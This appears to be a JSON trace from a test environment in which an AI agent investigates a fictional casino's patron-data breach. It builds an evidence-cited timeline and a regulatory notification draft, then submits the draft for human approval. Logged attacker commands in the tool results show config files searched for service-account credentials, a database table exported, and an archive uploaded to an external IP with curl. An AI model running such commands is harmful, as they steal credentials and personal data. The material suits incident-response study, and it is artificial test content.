@@ -1,0 +1,883 @@
+[
+ {
+  "step": 1,
+  "tool": "get_case",
+  "arguments": {},
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "case_id": "CASE-D90E10EE",
+    "operator": "Example Resort and Casino (fictional)",
+    "deadlines": {
+     "activated_at": "2026-03-14T17:15:00+00:00",
+     "initial_notification_due": "2026-03-15T17:15:00+00:00",
+     "initial_report_due": "2026-03-19T17:15:00+00:00",
+     "meeting_held": false
+    },
+    "hours_remaining_for_initial_notification": -5666.2,
+    "assessments": {},
+    "timeline_entries": 0,
+    "criteria": {
+     "unauthorized_access": "Unauthorized access to an information system",
+     "compromise": "Material loss of control or compromise",
+     "unauthorized_disclosure": "Unauthorized disclosure of data or information",
+     "gaming_operations_disrupted": "Gaming operations disrupted",
+     "personal_information_involved": "Patron or employee personal information involved",
+     "attacker_still_present": "Unauthorized party still present"
+    }
+   },
+   "duration_ms": 0.14
+  }
+ },
+ {
+  "step": 2,
+  "tool": "query_audit_events",
+  "arguments": {
+   "action": "password_reset"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 2,
+    "rows": [
+     {
+      "evidence_id": "AUD-0004",
+      "ts": "2026-03-14T01:30:00+00:00",
+      "actor": "hd.kpatel",
+      "action": "password_reset",
+      "target": "l.ortiz",
+      "detail": "Reset in person at the help desk. Badge checked. Ticket HD-4468."
+     },
+     {
+      "evidence_id": "AUD-0001",
+      "ts": "2026-03-14T02:10:00+00:00",
+      "actor": "hd.kpatel",
+      "action": "password_reset",
+      "target": "j.alvarez",
+      "detail": "Reset by phone. Caller gave employee ID. Ticket HD-4471."
+     }
+    ]
+   },
+   "duration_ms": 0.15
+  }
+ },
+ {
+  "step": 3,
+  "tool": "query_signins",
+  "arguments": {
+   "user": "j.alvarez"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 3,
+    "rows": [
+     {
+      "evidence_id": "SIG-0003",
+      "ts": "2026-03-14T02:18:00+00:00",
+      "user": "j.alvarez",
+      "host": "HTL-PMS-02",
+      "source_ip": "203.0.113.45",
+      "result": "success",
+      "mfa": "sms_new_device",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0)"
+     },
+     {
+      "evidence_id": "SIG-0006",
+      "ts": "2026-03-14T03:15:00+00:00",
+      "user": "j.alvarez",
+      "host": "HTL-PMS-02",
+      "source_ip": "203.0.113.45",
+      "result": "success",
+      "mfa": "remembered",
+      "user_agent": "Mozilla/5.0 (Windows NT 10.0)"
+     },
+     {
+      "evidence_id": "SIG-0008",
+      "ts": "2026-03-14T07:05:00+00:00",
+      "user": "j.alvarez",
+      "host": "HTL-PMS-02",
+      "source_ip": "10.10.8.40",
+      "result": "failure",
+      "mfa": "none",
+      "user_agent": "Windows Logon"
+     }
+    ]
+   },
+   "duration_ms": 0.08
+  }
+ },
+ {
+  "step": 4,
+  "tool": "query_audit_events",
+  "arguments": {
+   "target": "j.alvarez"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 3,
+    "rows": [
+     {
+      "evidence_id": "AUD-0001",
+      "ts": "2026-03-14T02:10:00+00:00",
+      "actor": "hd.kpatel",
+      "action": "password_reset",
+      "target": "j.alvarez",
+      "detail": "Reset by phone. Caller gave employee ID. Ticket HD-4471."
+     },
+     {
+      "evidence_id": "AUD-0002",
+      "ts": "2026-03-14T02:19:00+00:00",
+      "actor": "j.alvarez",
+      "action": "mfa_method_added",
+      "target": "j.alvarez",
+      "detail": "SMS method added for a new phone number"
+     },
+     {
+      "evidence_id": "AUD-0003",
+      "ts": "2026-03-14T07:00:00+00:00",
+      "actor": "m.okafor",
+      "action": "account_disabled",
+      "target": "j.alvarez",
+      "detail": "Disabled pending investigation"
+     }
+    ]
+   },
+   "duration_ms": 0.09
+  }
+ },
+ {
+  "step": 5,
+  "tool": "lookup_identity",
+  "arguments": {
+   "user": "j.alvarez"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "identity": {
+     "user": "j.alvarez",
+     "kind": "human",
+     "department": "Hotel front desk supervisor",
+     "usual_hosts": [
+      "HTL-PMS-01",
+      "HTL-PMS-02"
+     ]
+    }
+   },
+   "duration_ms": 0.06
+  }
+ },
+ {
+  "step": 6,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T02:10:00+00:00",
+   "summary": "Help desk reset the hotel supervisor's password after a phone call",
+   "evidence_ids": [
+    "AUD-0001"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "0c3f642b7aca6a42271fba359e0d131ef10552bebb16825bf7f5cabb77353115",
+    "prev_hash": "0000000000000000000000000000000000000000000000000000000000000000"
+   },
+   "duration_ms": 9.38
+  }
+ },
+ {
+  "step": 7,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T02:18:00+00:00",
+   "summary": "Sign-in to the hotel property management server from an external address on a new device, and a new SMS MFA method added",
+   "evidence_ids": [
+    "SIG-0003",
+    "AUD-0002"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "11f538f1dc59b6177ea13af4acce69324d3fbbde1b067366c1637ee24f9e8d9f",
+    "prev_hash": "0c3f642b7aca6a42271fba359e0d131ef10552bebb16825bf7f5cabb77353115"
+   },
+   "duration_ms": 11.27
+  }
+ },
+ {
+  "step": 8,
+  "tool": "query_process_events",
+  "arguments": {
+   "host": "HTL-PMS-02"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 4,
+    "rows": [
+     {
+      "evidence_id": "PRC-0002",
+      "ts": "2026-03-14T02:31:00+00:00",
+      "host": "HTL-PMS-02",
+      "user": "j.alvarez",
+      "process": "powershell.exe",
+      "command_line": "powershell -nop -c \"Get-ChildItem C:\\PMS\\config -Recurse -Include *.config | Select-String 'svc_'\""
+     },
+     {
+      "evidence_id": "PRC-0003",
+      "ts": "2026-03-14T02:42:00+00:00",
+      "host": "HTL-PMS-02",
+      "user": "j.alvarez",
+      "process": "sqlcmd.exe",
+      "command_line": "sqlcmd -S LOY-DB-01 -U svc_loyalty_sync -Q \"SELECT COUNT(*) FROM players\""
+     },
+     {
+      "evidence_id": "PRC-0004",
+      "ts": "2026-03-14T03:01:00+00:00",
+      "host": "HTL-PMS-02",
+      "user": "j.alvarez",
+      "process": "sqlcmd.exe",
+      "command_line": "sqlcmd -S LOY-DB-01 -U svc_loyalty_sync -Q \"SELECT * FROM players\" -o C:\\Users\\Public\\p.csv"
+     },
+     {
+      "evidence_id": "PRC-0005",
+      "ts": "2026-03-14T03:36:00+00:00",
+      "host": "HTL-PMS-02",
+      "user": "j.alvarez",
+      "process": "curl.exe",
+      "command_line": "curl.exe -T C:\\Users\\Public\\p.zip https://198.51.100.77/upload"
+     }
+    ]
+   },
+   "duration_ms": 0.14
+  }
+ },
+ {
+  "step": 9,
+  "tool": "lookup_asset",
+  "arguments": {
+   "host": "HTL-PMS-02"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "asset": {
+     "host": "HTL-PMS-02",
+     "role": "Hotel property management server",
+     "gaming_critical": 0,
+     "notes": "Guest reservations and folios"
+    }
+   },
+   "duration_ms": 0.07
+  }
+ },
+ {
+  "step": 10,
+  "tool": "lookup_identity",
+  "arguments": {
+   "user": "svc_loyalty_sync"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "identity": {
+     "user": "svc_loyalty_sync",
+     "kind": "service",
+     "department": "Loyalty platform",
+     "usual_hosts": [
+      "LOY-APP-01"
+     ]
+    }
+   },
+   "duration_ms": 0.05
+  }
+ },
+ {
+  "step": 11,
+  "tool": "query_signins",
+  "arguments": {
+   "user": "svc_loyalty_sync"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 3,
+    "rows": [
+     {
+      "evidence_id": "SIG-0002",
+      "ts": "2026-03-14T01:40:00+00:00",
+      "user": "svc_loyalty_sync",
+      "host": "LOY-APP-01",
+      "source_ip": "10.30.2.11",
+      "result": "success",
+      "mfa": "n/a",
+      "user_agent": "SQL Client"
+     },
+     {
+      "evidence_id": "SIG-0005",
+      "ts": "2026-03-14T02:44:00+00:00",
+      "user": "svc_loyalty_sync",
+      "host": "LOY-DB-01",
+      "source_ip": "10.10.8.22",
+      "result": "success",
+      "mfa": "n/a",
+      "user_agent": "SQL Client"
+     },
+     {
+      "evidence_id": "SIG-0007",
+      "ts": "2026-03-14T06:30:00+00:00",
+      "user": "svc_loyalty_sync",
+      "host": "LOY-DB-01",
+      "source_ip": "10.30.2.11",
+      "result": "success",
+      "mfa": "n/a",
+      "user_agent": "SQL Client"
+     }
+    ]
+   },
+   "duration_ms": 0.09
+  }
+ },
+ {
+  "step": 12,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T02:42:00+00:00",
+   "summary": "Loyalty service account used from the hotel server, a host it never normally uses, to query the player loyalty database",
+   "evidence_ids": [
+    "PRC-0002",
+    "PRC-0003",
+    "SIG-0005"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "ae1e61026a6399741cecc7ade045e660ad7d2ab4bfa497598ab4921e5a9b92f5",
+    "prev_hash": "11f538f1dc59b6177ea13af4acce69324d3fbbde1b067366c1637ee24f9e8d9f"
+   },
+   "duration_ms": 9.06
+  }
+ },
+ {
+  "step": 13,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T03:01:00+00:00",
+   "summary": "Full players table exported from the loyalty database to a file on the hotel server",
+   "evidence_ids": [
+    "PRC-0004",
+    "NET-0002"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "2e825e5d2f535551bf1700bd1640e586035ce1899f937fa7bbbc582068c28f1a",
+    "prev_hash": "ae1e61026a6399741cecc7ade045e660ad7d2ab4bfa497598ab4921e5a9b92f5"
+   },
+   "duration_ms": 9.62
+  }
+ },
+ {
+  "step": 14,
+  "tool": "query_network_flows",
+  "arguments": {
+   "src_host": "HTL-PMS-02"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 2,
+    "rows": [
+     {
+      "evidence_id": "NET-0002",
+      "ts": "2026-03-14T03:02:00+00:00",
+      "src_host": "HTL-PMS-02",
+      "dst": "LOY-DB-01",
+      "dst_port": 1433,
+      "bytes_out": 61000,
+      "bytes_in": 1950000000
+     },
+     {
+      "evidence_id": "NET-0003",
+      "ts": "2026-03-14T03:37:00+00:00",
+      "src_host": "HTL-PMS-02",
+      "dst": "198.51.100.77",
+      "dst_port": 443,
+      "bytes_out": 1780000000,
+      "bytes_in": 52000
+     }
+    ]
+   },
+   "duration_ms": 0.15
+  }
+ },
+ {
+  "step": 15,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T03:36:00+00:00",
+   "summary": "Archive uploaded from the hotel server to an external address, about 1.78 GB outbound",
+   "evidence_ids": [
+    "PRC-0005",
+    "NET-0003"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "2bd6c3b9b9ec6aa5b8b13b36de4949290a6f978fb14ff8d3b45be654207975aa",
+    "prev_hash": "2e825e5d2f535551bf1700bd1640e586035ce1899f937fa7bbbc582068c28f1a"
+   },
+   "duration_ms": 10.94
+  }
+ },
+ {
+  "step": 16,
+  "tool": "lookup_asset",
+  "arguments": {
+   "host": "LOY-DB-01"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "asset": {
+     "host": "LOY-DB-01",
+     "role": "Player loyalty database",
+     "gaming_critical": 0,
+     "notes": "Player club accounts and play history. Not part of game play."
+    }
+   },
+   "duration_ms": 0.1
+  }
+ },
+ {
+  "step": 17,
+  "tool": "lookup_data_inventory",
+  "arguments": {
+   "host": "LOY-DB-01"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "data_classes": [
+     {
+      "host": "LOY-DB-01",
+      "data_class": "patron_identity",
+      "personal_information": 1,
+      "description": "Player names, home addresses, dates of birth, driver's license numbers"
+     },
+     {
+      "host": "LOY-DB-01",
+      "data_class": "play_history",
+      "personal_information": 0,
+      "description": "Aggregate play and comp history"
+     }
+    ]
+   },
+   "duration_ms": 0.16
+  }
+ },
+ {
+  "step": 18,
+  "tool": "query_signins",
+  "arguments": {
+   "host": "SLOT-MGMT-01"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 1,
+    "rows": [
+     {
+      "evidence_id": "SIG-0004",
+      "ts": "2026-03-14T02:20:00+00:00",
+      "user": "t.nguyen",
+      "host": "SLOT-MGMT-01",
+      "source_ip": "10.40.1.9",
+      "result": "success",
+      "mfa": "push",
+      "user_agent": "Windows Logon"
+     }
+    ]
+   },
+   "duration_ms": 0.2
+  }
+ },
+ {
+  "step": 19,
+  "tool": "query_process_events",
+  "arguments": {
+   "host": "SLOT-MGMT-01"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 1,
+    "rows": [
+     {
+      "evidence_id": "PRC-0006",
+      "ts": "2026-03-14T02:22:00+00:00",
+      "host": "SLOT-MGMT-01",
+      "user": "t.nguyen",
+      "process": "slotmgr.exe",
+      "command_line": "slotmgr.exe --report daily"
+     }
+    ]
+   },
+   "duration_ms": 0.13
+  }
+ },
+ {
+  "step": 20,
+  "tool": "query_network_flows",
+  "arguments": {
+   "src_host": "SLOT-MGMT-01"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "count": 1,
+    "rows": [
+     {
+      "evidence_id": "NET-0004",
+      "ts": "2026-03-14T02:25:00+00:00",
+      "src_host": "SLOT-MGMT-01",
+      "dst": "SLOT-DB-01",
+      "dst_port": 1433,
+      "bytes_out": 12000,
+      "bytes_in": 880000
+     }
+    ]
+   },
+   "duration_ms": 0.14
+  }
+ },
+ {
+  "step": 21,
+  "tool": "lookup_asset",
+  "arguments": {
+   "host": "SLOT-MGMT-01"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "asset": {
+     "host": "SLOT-MGMT-01",
+     "role": "Slot management system",
+     "gaming_critical": 1,
+     "notes": "Slot accounting and machine monitoring"
+    }
+   },
+   "duration_ms": 0.09
+  }
+ },
+ {
+  "step": 22,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T02:22:00+00:00",
+   "summary": "Slot management activity in the same window is routine reporting by its usual operator; no link to the compromised accounts",
+   "evidence_ids": [
+    "PRC-0006",
+    "NET-0004"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "36206fbce82e370a4d698a24be3666dac04d51d0f0d98569d132c5c7a67eddbb",
+    "prev_hash": "2bd6c3b9b9ec6aa5b8b13b36de4949290a6f978fb14ff8d3b45be654207975aa"
+   },
+   "duration_ms": 10.63
+  }
+ },
+ {
+  "step": 23,
+  "tool": "add_timeline_entry",
+  "arguments": {
+   "event_time": "2026-03-14T07:00:00+00:00",
+   "summary": "Supervisor account disabled; a later sign-in attempt failed. The loyalty service account has not been reset",
+   "evidence_ids": [
+    "AUD-0003",
+    "SIG-0008"
+   ]
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "injection_flagged": false,
+    "entry_hash": "c9d69f19c828283ef786dfa5c09b1aafa0a7aaf8a9672b1aad8f4784168e3be4",
+    "prev_hash": "36206fbce82e370a4d698a24be3666dac04d51d0f0d98569d132c5c7a67eddbb"
+   },
+   "duration_ms": 10.33
+  }
+ },
+ {
+  "step": 24,
+  "tool": "search_regulation",
+  "arguments": {
+   "query": "material loss of control compromise unauthorized disclosure"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "results": [
+     {
+      "id": "4",
+      "cite": "[Reg 5.260(4)]",
+      "title": "Reporting obligations after a cybersecurity incident",
+      "text": "4. A covered entity that experiences a cybersecurity incident relating to its information system that has resulted in a material loss of control, compromise, unauthorized disclosure of data or information, or any other similar occurrence shall:",
+      "score": 19.093
+     },
+     {
+      "id": "2(d)",
+      "cite": "[Reg 5.260(2)(d)]",
+      "title": "Definition: Cybersecurity incident",
+      "text": "(d) \u201cCybersecurity incident\u201d means any act in which a person has gained unauthorized access to an information system of a covered entity for the purpose of disrupting, disabling, destroying, or controlling the system or destroying or gaining access to the information contained therein.",
+      "score": 2.619
+     }
+    ]
+   },
+   "duration_ms": 0.09
+  }
+ },
+ {
+  "step": 25,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "unauthorized_access",
+   "status": "supported",
+   "evidence_ids": [
+    "AUD-0001",
+    "SIG-0003",
+    "AUD-0002"
+   ],
+   "rationale": "Password reset by phone followed by an external sign-in and a new MFA method"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "unauthorized_access",
+    "status": "supported"
+   },
+   "duration_ms": 9.22
+  }
+ },
+ {
+  "step": 26,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "compromise",
+   "status": "supported",
+   "evidence_ids": [
+    "SIG-0005",
+    "PRC-0003",
+    "PRC-0004"
+   ],
+   "rationale": "Service account credentials used from an unexpected host to read the loyalty database"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "compromise",
+    "status": "supported"
+   },
+   "duration_ms": 9.56
+  }
+ },
+ {
+  "step": 27,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "unauthorized_disclosure",
+   "status": "supported",
+   "evidence_ids": [
+    "NET-0002",
+    "PRC-0005",
+    "NET-0003"
+   ],
+   "rationale": "Players table exported and an archive of similar size sent to an external address"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "unauthorized_disclosure",
+    "status": "supported"
+   },
+   "duration_ms": 8.49
+  }
+ },
+ {
+  "step": 28,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "gaming_operations_disrupted",
+   "status": "not_supported",
+   "evidence_ids": [
+    "PRC-0006",
+    "NET-0004"
+   ],
+   "rationale": "Slot management activity is routine and unconnected to the compromised accounts"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "gaming_operations_disrupted",
+    "status": "not_supported"
+   },
+   "duration_ms": 13.02
+  }
+ },
+ {
+  "step": 29,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "personal_information_involved",
+   "status": "supported",
+   "evidence_ids": [
+    "PRC-0004"
+   ],
+   "rationale": "The exported table holds patron names, addresses, dates of birth and license numbers"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "personal_information_involved",
+    "status": "supported"
+   },
+   "duration_ms": 9.33
+  }
+ },
+ {
+  "step": 30,
+  "tool": "set_criterion_assessment",
+  "arguments": {
+   "criterion": "attacker_still_present",
+   "status": "unknown",
+   "evidence_ids": [
+    "AUD-0003",
+    "SIG-0008"
+   ],
+   "rationale": "The supervisor account is disabled, but the service account has not been reset"
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "recorded": true,
+    "criterion": "attacker_still_present",
+    "status": "unknown"
+   },
+   "duration_ms": 8.71
+  }
+ },
+ {
+  "step": 31,
+  "tool": "draft_initial_notification",
+  "arguments": {
+   "summary": "A caller obtained a password reset for a hotel supervisor account through the help desk [AUD-0001]. The account then signed in from an external address and registered a new MFA method [SIG-0003] [AUD-0002]. From the hotel property management server, the attacker used a loyalty service account to export the player loyalty database [SIG-0005] [PRC-0004] [NET-0002]. About 1.78 GB was then sent to an external address [PRC-0005] [NET-0003]. Slot management activity in the same window was routine [PRC-0006] [NET-0004]. The supervisor account has been disabled, and whether the unauthorized party still has access is not yet determined [AUD-0003] [SIG-0008]."
+  },
+  "result": {
+   "ok": true,
+   "executed": true,
+   "result": {
+    "saved": true,
+    "draft_id": "DRAFT-16032584",
+    "validation": {
+     "valid": true,
+     "errors": [],
+     "evidence_cited": [
+      "AUD-0001",
+      "SIG-0003",
+      "AUD-0002",
+      "SIG-0005",
+      "PRC-0004",
+      "NET-0002",
+      "PRC-0005",
+      "NET-0003",
+      "PRC-0006",
+      "NET-0004",
+      "AUD-0003",
+      "SIG-0008"
+     ],
+     "regulation_cited": []
+    }
+   },
+   "duration_ms": 9.09
+  }
+ },
+ {
+  "step": 32,
+  "tool": "submit_initial_notification",
+  "arguments": {
+   "draft_id": "DRAFT-16032584",
+   "justification": "Draft validated; requesting human approval to send once a person records the notifiability decision"
+  },
+  "result": {
+   "ok": true,
+   "executed": false,
+   "approval_id": "APR-97e761a3cb7c",
+   "status": "pending",
+   "tool_name": "submit_initial_notification",
+   "requested_at": "2026-11-06T19:26:21+00:00",
+   "message": "This action changes entitlements and was NOT executed. A human must approve it. The requesting agent cannot approve its own request."
+  }
+ },
+ {
+  "step": 33,
+  "final": "Draft ready for human review."
+ }
+]
